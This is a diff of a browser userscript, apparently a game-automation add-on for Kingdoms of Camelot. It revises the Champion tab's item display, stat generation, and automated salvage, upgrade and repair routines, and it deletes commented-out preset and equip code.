+				document.getElementById('pbgenchstats').addEventListener('click',function () { window.prompt("Copy to clipboard: Ctrl+C", GenerateStats(chID)); } , false); 
+			}	
+			
+			function GenerateStats(chID) {
+				for (k in unsafeWindow.kocChampionItems) {
+					var champ_item = unsafeWindow.kocChampionItems[k];
+					if (champ_item.unique == chID) {
+						//UniqueItems["28007"] = {Id:28007,Name:"Blade of the Wild", Effects:[{type:201,tier:5},{type:5,tier:2},{type:204,tier:2},{type:207,tier:2},{type:1,tier:3}],Faction:3,Type:1};
+						var Results = 'UniqueItems["'+chID+'"] = {Id:'+chID+',Name:"'+champ_item.subtype+'", Effects:[';
+						var firsteffect = true;
+						for (e in champ_item.effects) {
+							if (!firsteffect) Results += ',';
+							Results += '{type:'+champ_item.effects[e].id+',tier:'+champ_item.effects[e].tier+'}';
+							firsteffect = false;
+						}
+						Results += '],Faction:'+champ_item.faction+',Type:'+champ_item.type+'};';
+						break;
+					}
+				}
+				return Results;
+			}
+		};
+	},
+	
+	DisplayCard : function (champ_item) {
+		var t = Tabs.Champion;
+		var D = [];
+		if (champ_item == null) {
+			D.push("<div>");
+			D.push("</div>");
+			return D.join("");
+		}
+
+		D.push("<div style='overflow: hidden; position: relative; left: 0px; top: 0px;'>");
+		D.push(" <div id='throneInventoryItemTooltip'>");
+		D.push("<div class='section' style='overflow: visible;' id = 'idsection'>");
+		D.push(" <div class='title " + champ_item.createPrefix().toLowerCase() + "' style='text-transform: capitalize;'> ");
+		D.push(champ_item.name + (champ_item.unique ? " +" + champ_item.level : ""));
+		D.push(" </div> ");
+		D.push(" <div class='description'> ");
+		var uniquestyle = "";
+		if (champ_item.unique != 0) {
+			uniquestyle = 'background:transparent url("https://kabam1-a.akamaihd.net/silooneofcamelot/fb/e2/src/img/champion_hall/unique_'+t.imgUniqueTypes[champ_item.Type-1]+'_'+champ_item.faction+'_70x70_'+champ_item.unique + '.png"); top left no-repeat; background-size: 70px 70px;';
+		}
+		D.push("<div class='portrait " + champ_item.faction + " " + champ_item.type + "' style='"+uniquestyle+"'> </div> ");
+		D.push("<ul>");
+		D.push("<li> " + unsafeWindow.g_js_strings.commonstr.faction + ": " + champ_item.faction + "</li>");
+		D.push("<li> " + unsafeWindow.g_js_strings.commonstr.quality + ": " + t.CardQuality(champ_item) + "</li>");
+		D.push("<li> " + unsafeWindow.g_js_strings.commonstr.type + ": " + champ_item.type + "</li>");
+		D.push("<li> " + unsafeWindow.g_js_strings.commonstr.level + ": " + champ_item.level + "</li>");
+		D.push("<li> " + unsafeWindow.g_js_strings.commonstr.might + ": " + t.CardMight(champ_item) + "</li>");
+		D.push("</ul>");
+		D.push(" </div> ");
+		D.push(" <ul> ");
+
+		if (champ_item.unknown) {
+			D.push(" <li class='effect'><center>Unknown</center></li> ");
+			D.push(" <li class='effect'><div style='font-size:10px;'><center>If you have one in your Champions Hall please click the 'Generate Stats' link below and send the results to the script developer.</center></div></li>");
+		}
+		else {
+			for (slot in champ_item.effects) {
+				try {
+					var N = champ_item.effects[slot];
+					effect = eval("unsafeWindow.g_js_strings.effects.name_"+N.id);
+					tier = t.championStatTiers[N.id][N.tier];
+					if (!tier) tier = t.championStatTiers[N.id][N.tier-1];
+					var base = tier.base || 0;
+					var level = champ_item.level || 0;
+					var growth = tier.growth || 0;
+					percent = +(base + ((level * level + level) * growth * 0.5));
+					var wholeNumber = false;
+					if (Math.round(parseFloat(percent)) == parseFloat(percent)) wholeNumber = true;
+					percent = (percent > 0) ? percent : +percent;
+					if (wholeNumber)
+						percent = parseFloat(percent).toFixed(0);
+					else
+						percent = parseFloat(percent).toFixed(2);
+					css = (slot % 2 === 0) ? "even" : "odd";
+					B = +(slot.split("slot")[1]);
+					percent = (percent > 0) ? percent : percent;
+					if (B <= champ_item.quality) {
+						if (N.id < 200) {
+							D.push(" <li class='effect " + css + "' style='color: #1751A5;'> " + percent + " " + effect + " </li> ");
+						}	
+						else {
+							D.push(" <li class='effect " + css + "'> " + percent + " " + effect + " </li> ");
+						}	
+					} else {
+						D.push(" <li class='effect disabled " + css + "'> " + percent + " " + effect + " </li> ");
+					}
+				}
+				catch (e) { }
+			}
+		}	
+		D.push(" </ul> ");
+		D.push(" </div> ");
+		D.push(" </ul> ");
+		D.push(" </div> ");
+		D.push(" </div> ");
+		return D.join("");
+	},
+	CardMight : function (champ_item) {
+		var t = Tabs.Champion;
+		var JewelBonus = 1;
+		var F = unsafeWindow.cm.thronestats.mightByQuality || {},
+		H = unsafeWindow.cm.thronestats.mightByLevel || {},
+		G = F[champ_item.quality] && F[champ_item.quality].Might ? +F[champ_item.quality].Might : 0,
+		E = F[champ_item.level] && F[champ_item.level].Might ? +F[champ_item.level].Might : 0;
+		return Math.round((unsafeWindow.cm.ThroneController.mightOfItemQuality(champ_item) + H[champ_item.level].Might) * JewelBonus);
+	},
+	CardQuality : function (champ_item) {
+		var t = Tabs.Champion;
+		var b = champ_item.quality,
+		a;
+		if (champ_item.unique > 0) {
+			a = unsafeWindow.g_js_strings.throneRoom.unique
+		} else {
+			switch (b) {
+				case 0: a = unsafeWindow.g_js_strings.throneRoom.simple; break;
+				case 1:	a = unsafeWindow.g_js_strings.throneRoom.common; break;
+				case 2:	a = unsafeWindow.g_js_strings.throneRoom.uncommon; break;
+				case 3: a = unsafeWindow.g_js_strings.throneRoom.rare; break;
+				case 4:	a = unsafeWindow.g_js_strings.throneRoom.epic; break;
+				case 5:	a = unsafeWindow.g_js_strings.throneRoom.wondrous; break;
+				case 6: a = unsafeWindow.g_js_strings.throneRoom.miraculous; break;
+				default: a = unsafeWindow.g_js_strings.throneRoom.simple; break;
+			}
+		}
+		return a
+	},
+	
    Assign : function (){
 	var t =Tabs.Champion;
 	m =  '<DIV class=pbstat><b>Champion Assignments (EXPERIMENTAL)</b></div><TABLE border=2px align=center>';
@@ -24105,36 +24479,6 @@ Tabs.Champion = {
             },
         });
     },
-
-/***   
-   Caps : function (){
-      var t =Tabs.Champion;
-    m =  '<DIV class=ptstat><b>Champion Room Caps</b></div><TABLE border=2px align=center>';
-    m += '<TR><TD width="150px"><B>Boost Name</b></td><TD width="50px"><B>Max</b></td><TD><B>Min</b></td><TD style="border:0;width:50px"></td><TD width="150px"><B>Boost Name</b></td><TD width="50px"><B>Max</b></td><TD width="50px"><B>Min</b></td></tr><TR>';
-    var counter =0;
-    for (k in unsafeWindow.cm.Championstats.boosts){
-      counter++
-      var boost = unsafeWindow.cm.Championstats.boosts[k]
-      m += '<TD>'+ boost.BoostName + '</td><TD>'+ boost.Max +'<SPAN id=maxPerc_'+k+'></div></td><TD>' + boost.Min + '<SPAN id=minPerc_'+k+'></div>';
-
-      if (counter % 2 == 0){
-         m += '<TR>';
-      }else {
-         m += '</td><TD style="border:0">';
-      }
-    }
-      t.Overv.innerHTML = m;
-    for (k in unsafeWindow.cm.Championstats.boosts){
-      var boost = unsafeWindow.cm.Championstats.boosts[k]
-      if (boost.CapType == "percent"){
-            document.getElementById('maxPerc_'+k).innerHTML = '%'
-         if (boost.Min != "none"){
-            document.getElementById('minPerc_'+k).innerHTML = '%'
-         }
-      }
-    }
-   },
-***/
 
  Salvage : function (){
     var t = Tabs.Champion;
@@ -24682,76 +25026,6 @@ FillEquipCheckboxes: function(){
    }  
 },
 
-/***
-doPreset : function (room, retry) {
-        var t = Tabs.Champion;    
-        actionLog('changing to tr '+room);
-	var div;
-   if(isNaN(retry))retry=0;
-   if(retry > 15) {if(document.getElementById('ChampionTRS'))document.getElementById('ChampionTRS').innerHTML = "<font color=red>failed to change Champion room..Giving Up</font>";return;};
-
-//      if(document.getElementById('ChampionTRS'))
-//      document.getElementById('tra'+unsafeWindow.seed.champion.activeSlot).disabled = false;
-//      if(document.getElementById('ChampionHUD'))
-//      document.getElementById('htra'+unsafeWindow.seed.champion.activeSlot).disabled = false;
-      
-
-        var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
-//        params.ctrl = 'ChampionRoom\\ChampionRoomServiceAjax';
-        params.action = 'setPreset';
-        params.presetId = room;
-          new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/_dispatch53.php" + unsafeWindow.g_ajaxsuffix, {
-            method: "post",
-            parameters: params,
-            loading: true,
-            onSuccess: function (transport) {
-                var rslt = eval("(" + transport.responseText + ")");
-                if(rslt.ok){
-			if(document.getElementById('tra'+params.presetId)) {
-				for(a = 1;a <= Seed.champion.slotNum;a++)
-				document.getElementById('tra'+a).disabled = false;
-               			document.getElementById('tra'+params.presetId).disabled = true;
-			};
-			if(document.getElementById('ChampionHUD')) {
-				for(a = 1;a <= Seed.champion.slotNum;a++) {
-				document.getElementById('htra'+a).disabled = false;
-				document.getElementById('htra'+a).className = "pbttabs";
-			};
-				document.getElementById('htra'+params.presetId).disabled = true;
-				document.getElementById('htra'+params.presetId).className = "pbttabsdis";
-			};
-               		t.TTpaint(params.presetId);
-               		if(document.getElementById('ChampionInventoryPreset'+params.presetId))
-               		   button = document.getElementById('ChampionInventoryPreset'+params.presetId);
-               		else
-               		   button = '<li id="ChampionInventoryPreset' + params.presetId + '" class="selected">'+params.presetId+'</li>';
-               		   unsafeWindow.cm.ChampionView.clickActivePreset(button);
-                	}
-                else {
-//                    if(document.getElementById('ChampionTRS'))document.getElementById('ChampionTRS').innerHTML = "<font color=red>failed to change Champion room..Trying Again</font>";
-//		    else {
-//		      div = document.createElement('div');
-//		      div.innerHTML = '<DIV style="font-size:18px; background-color:#a00; color:#fff"><CENTER><BR>failed to change Champion room..Trying Again<BR></div>';
-//		      document.body.insertBefore (div, document.body.firstChild);
-//		    }
-                    setTimeout(function (){t.doPreset(room,Number(retry+1))},3000);
-                }
-            },
-            onFailure: function () {
-//                    if(document.getElementById('ChampionTRS'))document.getElementById('ChampionTRS').innerHTML = "<font color=red>failed to change Champion room..Trying Again</font>";
-//		    else {
-//		      div = document.createElement('div');
-//		      div.innerHTML = '<DIV style="font-size:18px; background-color:#a00; color:#fff"><CENTER><BR>failed to change Champion room..Trying Again<BR></div>';
-//		      document.body.insertBefore (div, document.body.firstChild);
-//		    }
-               setTimeout(function (){t.doPreset(room,Number(retry+1))},3000);
-            },
-        });
-
-},
-***/
-
-
 fupgenh: function (z){
 var t = Tabs.Champion;
 document.getElementById("ptmrcxSubUE").click()
@@ -24768,8 +25042,8 @@ postInfo : function (z){
 		if (id == undefined)continue;
 		tier = parseInt(y["effects"][""+i]["tier"]);
 		level = y["level"];
-        	p = t.championStatTiers[id][tier];
- 		Current = p.base + ((level * level + level) * p.growth * 0.5);
+		p = t.championStatTiers[id][tier];
+		Current = p.base + ((level * level + level) * p.growth * 0.5);
 		m+='||'+Current + "% " + t.championStatEffects[id]["1"];
 	};
 	sendChat ("/a "+  m);
@@ -24970,20 +25244,20 @@ PaintSalvageHistory : function() {
                   setTimeout(t.doRepair,5000);
                   clearTimeout(t.setActionTimer);
                   t.setActionTimer = setInterval(t.doAction,10000);
-		return;
+                  return;
 		}
         	if (ChampionOptions.Items.length ==0) {
         		if(document.getElementById('chShowStatus'))document.getElementById('chShowStatus').innerHTML = "No items in queue!!";
                 	clearTimeout(t.setActionTimer);
                 	t.setActionTimer = setInterval(t.doAction,60*1000);
-		return;
+                	return;
         	}
 //        	if (unsafeWindow.kocChampionItems[ChampionOptions.Items["0"]["id"]].isBroken == true){
         	if (unsafeWindow.kocChampionItems[ChampionOptions.Items["0"]["id"]].status < 0){
                 	setTimeout(t.doRepair,5000);
                 	clearTimeout(t.setActionTimer);
                 	t.setActionTimer = setInterval(t.doAction,10000);
-		return;
+                	return;
         	}
         	ChampionOptions.Items["0"]["active"] = true;
         	t.PaintQueue();
@@ -25022,22 +25296,6 @@ PaintSalvageHistory : function() {
         }
       Seed.resources['city'+cityid].rec5[0]=parseInt(Seed.resources['city'+cityid].rec5[0] - parseInt(ChampionOptions.Items["0"]["cost"]));
         var buffItem = 0;
-/***
-        if(ChampionOptions.UseTokens) {
-         if(ChampionOptions.UseMO) {
-          if(parseInt(unsafeWindow.seed.items['i20004'])>0)//mystic orb
-             buffItem = 20004;
-          if(parseInt(unsafeWindow.seed.items['i20003'])>0)//lesser mystic orb
-             buffItem = 20003;
-	 }
-         if(parseInt(unsafeWindow.seed.items['i20002'])>0)//protection stone
-            buffItem = 20002;
-         if(parseInt(unsafeWindow.seed.items['i20001'])>0)//lesser protection stone
-            buffItem = 20001;
-         if(buffItem)
-            unsafeWindow.cm.InventoryView.removeItemFromInventory(buffItem);
-      };
-***/
         var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
 //        params.ctrl = 'ChampionRoom\\ChampionRoomServiceAjax';
         params.action = 4;
@@ -25137,12 +25395,6 @@ PaintSalvageHistory : function() {
       Seed.resources['city'+cityid].rec5[0]=parseInt(Seed.resources['city'+cityid].rec5[0] - parseInt(ChampionOptions.Items["0"]["cost"]));
         var buffItem = 0;
         if(ChampionOptions.UseTokens) {
-/***
-         if(ChampionOptions.UseST) {
-          if(parseInt(unsafeWindow.seed.items['i21052'])>0)//smith token
-             buffItem = 21052;
-	 }
-***/
          if(parseInt(unsafeWindow.seed.items['i21051'])>0)//journeymans token
             buffItem = 21051;
          if(buffItem)
@@ -25200,8 +25452,8 @@ PaintSalvageHistory : function() {
                        saveChampionOptions();
                        if(document.getElementById('chShowStatus'))
                      document.getElementById('chShowStatus').innerHTML = 'Upgrade failed :( <br />Item: ' + unsafeWindow.kocChampionItems[ChampionOptions.Items["0"]["id"]].name +"<br />Waiting for repair...";
-                     if(document.getElementById('chShowTries'))
-                       document.getElementById('chShowTries').innerHTML = "Tries: " + ChampionOptions.Tries + "<br />Good requests: " + ChampionOptions.Good + "   Bad requests: " + ChampionOptions.Bad;
+                  if(document.getElementById('chShowTries'))
+                     document.getElementById('chShowTries').innerHTML = "Tries: " + ChampionOptions.Tries + "<br />Good requests: " + ChampionOptions.Good + "   Bad requests: " + ChampionOptions.Bad;
 		     setTimeout(t.doRepair,5000);
                     }
 //                    unsafeWindow.cm.ChampionView.renderInventory(unsafeWindow.kocChampionItems);
@@ -25309,26 +25561,6 @@ PaintSalvageHistory : function() {
         
      doRepair : function() {
         var t = Tabs.Champion;
-        //cid and aetherstone no longer charged for Champion repairs?!?
-        /**
-        var cityid = 0;
-        for (var k in Cities.byID) {
-            if ( Seed.resources["city"+k]["rec5"][0] > ChampionOptions.minStones)
-            {
-               cityid = k;
-            }
-        }
-        if(cityid == 0){
-           document.getElementById('chShowStatus').innerHTML = "Not enough aetherstone to enhance";
-           return;    
-        }
-        var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
-        params.action = 6;
-        if(ChampionOptions.ibrokeitems.length) params.eid = ChampionOptions.ibrokeitems[0];
-        else params.eid = ChampionOptions.Items["0"]["id"];
-	params.gems = 0;
-        params.cityId = cityid;
-                    **/
         if(ChampionOptions.ibrokeitems.length > 0)
         if(unsafeWindow.kocChampionItems[ChampionOptions.ibrokeitems[0]]) {
 //        if(!unsafeWindow.kocChampionItems[ChampionOptions.ibrokeitems[0]].isBroken)ChampionOptions.ibrokeitems.shift();//if it's not broke, don't fix it! lol
@@ -25391,69 +25623,6 @@ PaintSalvageHistory : function() {
             },
         });
     },
-
-/***
-    doEquip : function(n) {
-        var t = Tabs.Champion;
-        if (typeof(unsafeWindow.kocChampionItems[n]) == 'object') {
-                var y = unsafeWindow.kocChampionItems[n];
-        } else return;
-
-        var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
-        logit(n.toSource());
-        params.ctrl = 'ChampionRoom\\ChampionRoomServiceAjax';
-        params.action = 'equipItem';
-        params.itemId = y.equipmentId;
-        params.presetId = unsafeWindow.seed.champion.activeSlot;
-                    
-          new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/_dispatch53.php" + unsafeWindow.g_ajaxsuffix, {
-            method: "post",
-            parameters: params,
-            loading: true,
-            onSuccess: function (transport) {
-                var rslt = eval("(" + transport.responseText + ")");
-                    if(rslt.ok){
-                            unsafeWindow.cm.ChampionView.clickItemEquip(y);
-                            t.FillEquipCheckboxes();
-                   }
-            },
-            onFailure: function () {
-               return;
-            },
-        });
-    },
-***/
-/***  
-  doUnequip : function(n,preset) {
-        var t = Tabs.Champion;
-        if (typeof(unsafeWindow.kocChampionItems[n]) == 'object') {
-                var y = unsafeWindow.kocChampionItems[n];
-        } else return;
-
-        var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
-        logit(n.toSource());
-        params.ctrl = 'ChampionRoom\\ChampionRoomServiceAjax';
-        params.action = 'unequipItem';
-        params.itemId = y.equipmentId;
-        params.presetId = document.getElementById("preset").value;
-                    
-          new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/_dispatch53.php" + unsafeWindow.g_ajaxsuffix, {
-            method: "post",
-            parameters: params,
-            loading: true,
-            onSuccess: function (transport) {
-                var rslt = eval("(" + transport.responseText + ")");
-                    if(rslt.ok){
-                            unsafeWindow.cm.ChampionView.clickItemUnequip(y);
-                            t.FillEquipCheckboxes();
-                   }
-            },
-            onFailure: function () {
-               return;
-            },
-        });
-    },
-***/  
 
   repairTimerUpdate :function (){
         var t = Tabs.Champion;
@@ -25634,7 +25803,8 @@ salvageCheck : function (){
                     if (y.rarity > ChampionOptions.SalvageQuality) level=true;
                     if(y.level > 0) level = true;
 //                    if(ChampionOptions.SaveUnique) if(y.unique > 0) IsUnique = true;
-                    if(ChampionOptions.SaveUnique) if(y.rarity > 5) IsUnique = true;
+//                    if(ChampionOptions.SaveUnique) if(y.rarity > 5) IsUnique = true;
+                    if(ChampionOptions.SaveUnique) if(y.itemId != 0) IsUnique = true;
                     if (ChampionOptions.SalvageQuality == 0) level=true;
 //					     if (ChampionOptions.savehero && y.type=="hero") IsHero = true;                    
                     
@@ -25667,11 +25837,11 @@ salvageCheck : function (){
                     if(ChampionOptions.SingleStat) {
                         for (h in ChampionOptions.Salvage) {
                         if(ChampionOptions.Salvage[h] && ChampionOptions.SalvageA[h].Min > 0 && ChampionOptions.SalvageA[h].cur >= ChampionOptions.SalvageA[h].Min) {
-                          // logit(''+ChampionOptions.Salvage[h]+' && '+ChampionOptions.SalvageA[h].Min+' > 0 && '+ChampionOptions.SalvageA[h].cur+' >= '+ChampionOptions.SalvageA[h].Min);
+                           //logit(''+ChampionOptions.Salvage[h]+' && '+ChampionOptions.SalvageA[h].Min+' > 0 && '+ChampionOptions.SalvageA[h].cur+' >= '+ChampionOptions.SalvageA[h].Min);
                               MinReq = true;
                            }; 
                         if(ChampionOptions.Salvage[h] && ChampionOptions.SalvageA[h][y.type] && ChampionOptions.SalvageA[h][y.type] > 0 && ChampionOptions.SalvageA[h].cur >= ChampionOptions.SalvageA[h][y.type]) {
-                         //  logit(''+ChampionOptions.Salvage[h]+' && '+ChampionOptions.SalvageA[h].Min+' > 0 && '+ChampionOptions.SalvageA[h].cur+' >= '+ChampionOptions.SalvageA[h].Min);
+                           //logit(''+ChampionOptions.Salvage[h]+' && '+ChampionOptions.SalvageA[h].Min+' > 0 && '+ChampionOptions.SalvageA[h].cur+' >= '+ChampionOptions.SalvageA[h].Min);
                              // MinReq = true;
                               logit('saving '+y.name+' due to '+y.type+' and '+h);
                            }; 
@@ -25687,7 +25857,7 @@ salvageCheck : function (){
 //                    if (!level && number < ChampionOptions.Championkeep && NotUpgrading && !y.isEquipped && !y.isBroken && t.LastDeleted != y.equipmentId && NotFavorite && !MinReq && !IsUnique && !IsHero) {
 	                  //  logit ((!level) +'&&'+ (number < ChampionOptions.Championkeep) +'&&'+ (NotUpgrading) +'&&'+ (y.equippedTo == 0) +'&&'+ (y.status == 1) +'&&'+ (t.LastDeleted != y.equipmentId) +'&&'+ NotFavorite +'&&'+ (!MinReq) +'&&'+ (!IsUnique) +'&&'+ (!IsHero));
                     if (!level && number < ChampionOptions.Championkeep && NotUpgrading && y.equippedTo == 0 && y.status == 1 && t.LastDeleted != y.equipmentId && NotFavorite && !MinReq && !IsUnique && !IsHero) {
-               //   logit(y.name);
+                  //logit(y.name);
                         t.SalvageArray.push(y.equipmentId);
                     }                     
             }
@@ -25782,87 +25952,6 @@ doSalvage : function(){
             t.salvageCheck();
         }
 },
-/***
-ChampionHUDinit : function (){
-	var t = Tabs.Champion;
-	var div = document.createElement('div');
-	var m = '<TABLE height=0% class=pbTab><TR align="center">';
-    for (var k=1;k<Number(Seed.champion.slotNum+1);k++) {
-		if(k == 9)m+='</TR><TR align="center">';
-       m += '<TD><INPUT id=htra'+k+' type=submit value='+k+' class="pbttabs" title='+ChampionOptions.tabnames[k]+'></td>';
-    };
-    m += '</TR></table><br>';
-	div.innerHTML = m;
-	div.style.position="absolute";
-	div.style.top="29px";
-	div.style.right="170px";
-	div.id="ChampionHUD";
-	div.style.zIndex="20000";
-	par=document.getElementById('mod_maparea');
-	par.insertBefore(div,par.firstChild);
-	for (var k=1;k<Number(Seed.champion.slotNum+1);k++)
-		document.getElementById('htra'+k).addEventListener ('click', function(e){t.doPreset(e.target.value)}, false);
-	document.getElementById('htra'+unsafeWindow.seed.champion.activeSlot).disabled = true;
-	document.getElementById('htra'+unsafeWindow.seed.champion.activeSlot).className = "pbttabsdis";
-
-	try {
-	    function hudSlotWatcher(id, oldval, newval) {
-	        try {
-	            setTimeout(Tabs.Champion.ChampionHUDredraw,200);
-	        } catch (e) {}
-	        return newval;
-	    };
-
-
-	    // If the preset is changed, update the displays
-	    Seed.champion.multiWatch("activeSlot", hudSlotWatcher);
-
-	    // some of the seed updates replace the seed.champion value.  when this happens reinstall the watcher
-	    Seed.multiWatch("Champion", function (id, oldval, newval) {
-	        // register with the seed so we know when the Champion object is replaced
-	        try {
-	            // add a new watcher / remove the old one
-	            if (oldval.multiUnwatch) oldval.multiUnwatch("activeSlot", hudSlotWatcher);
-
-	            // if another script create this object, the prototypes won't be defined.  If so, add the functions manually
-	            if (!newval.multiWatch) {
-	                newval.multiWatch = Object.prototype.multiWatch;
-	                newval.multiUnwatch = Object.prototype.multiUnwatch;
-	            }
-
-	            newval.multiWatch("activeSlot", hudSlotWatcher);
-	        } catch (e) {
-	            logit( " Error in handler for Champion watch" + e.toString());
-	        }
-
-	        return newval;
-	    });
-	} catch (e) { }
-
-},
-***/
-/***
-ChampionT : function (){
-        var t = Tabs.Champion;    
-     var m = '<DIV  class=pbStat>Champion room toggle</div><center><TABLE height=0% class=pbTab><TR align="center">';
-            for (var k=1;k<Number(Seed.champion.slotNum+1);k++) {
-                 m += '<TD><INPUT id=autotr'+k+' type=checkbox '+ (ChampionOptions.autotoggle[k]?'CHECKED ':'') +'/><INPUT id=tra'+k+' type=submit value='+k+'><br><input type="text" id=trt'+k+' size=10 value='+ChampionOptions.tabnames[k]+'></td>';
-                 if(k == 8)m+='</TR><TR>';
-                 
-                 };
-            m += '</TR></table>'+translate('Will auto change to checked Champion rooms and rotate when afk')+'<br><br><button id=ttptc>Post to chat</button> <br>';
-            m+='<table><TD><DIV id=ChampionTRS></div></td></table>';
-            t.Overv.innerHTML = m;
-            for (var k=1;k<Number(Seed.champion.slotNum+1);k++) {
-            	document.getElementById('tra'+k).addEventListener ('click', function(e){t.doPreset(e.target.value)}, false);
-            	document.getElementById('trt'+k).addEventListener ('change', function(){ChampionOptions.tabnames[Number(String(this.id).replace(/trt/,""))] = this.value;saveChampionOptions();}, false);
-            	document.getElementById('autotr'+k).addEventListener ('click', function(){ChampionOptions.autotoggle[Number(String(this.id).replace(/autotr/,""))] = this.checked; saveChampionOptions();}, false);
-         	};
-            t.TTpaint(unsafeWindow.seed.champion.activeSlot);
-            document.getElementById('tra'+unsafeWindow.seed.champion.activeSlot).disabled = true;
-            document.getElementById('ttptc').addEventListener('click', t.TTpoststats, false);
-},
-***/
 
 TTpaint : function(room) {
         var t = Tabs.Champion;
@@ -25891,84 +25980,6 @@ TTpaintstats : function () {
          m+='</table></div>';
           document.getElementById('ChampionTRS').innerHTML = m;  
 },
-
-/***
-TTpoststats : function () {
-	var m = ':::.|Champion Room #'+unsafeWindow.seed.champion.activeSlot;
-         for(i in t.Effects) {
-			 if(i<94){
-         var z = unsafeWindow.cm.ThroneController.effectBonus(Number(i));
-         if(z != 0) {
-            m+='||'+unsafeWindow.cm.thronestats.effects[i][1]+': '+z+'%';
-                }
-         };
-	 };
-    sendChat ("/a "+  m);
-
-},
-***/
-/***
-ChampionHUDredraw : function () {
-	var trm = unsafeWindow.seed.champion.activeSlot;
-			if(document.getElementById('tra'+trm)) {
-				for(a = 1;a <= Seed.champion.slotNum;a++)
-				document.getElementById('tra'+a).disabled = false;
-               document.getElementById('tra'+trm).disabled = true;
-			};
-			 if(document.getElementById('ChampionHUD')) {
-				for(a = 1;a <= Seed.champion.slotNum;a++) {
-				document.getElementById('htra'+a).disabled = false;
-				document.getElementById('htra'+a).className = "pbttabs";
-			};
-				document.getElementById('htra'+trm).disabled = true;
-				document.getElementById('htra'+trm).className = "pbttabsdis";
-			};	
-},
-***/
-
-/***
-rotateChampion : function () {
-	var t = Tabs.Champion;
-	if(isAFK && !Options.alertConfig.RecentActivity){
-		var activeSlot = Number(Seed.champion.activeSlot);
-		var foundone = false;
-	for(k=activeSlot+1;k <=  Number(Seed.champion.slotNum);k++){
-				if(ChampionOptions.autotoggle[k]) {
-				t.doPreset(k);
-				foundone = true;
-				break;
-			}
-	}
-	
-	if(!foundone) {
-		for(k = 1;k<=Number(Seed.champion.slotNum);k++){
-				if(ChampionOptions.autotoggle[k]) {
-				t.doPreset(k);
-				foundone = true;
-				break;
-			}
-		}
-	}
-		
-		
-		
-		
-// Complex loop that browsers can't handle =/. replaced with multiple loops above.		
-//		
-//			for (k=activeSlot+1;k != activeSlot;k++) {
-//				if(k > Number(Seed.champion.slotNum)) k = 1;
-//				//logit('k is '+k);
-//				if(ChampionOptions.autotoggle[k]) {
-//				t.doPreset(k);
-//				break;
-//			}
-//		}
-		
-		
-		
-	}
-},
-***/
 
 hide : function (){
 },
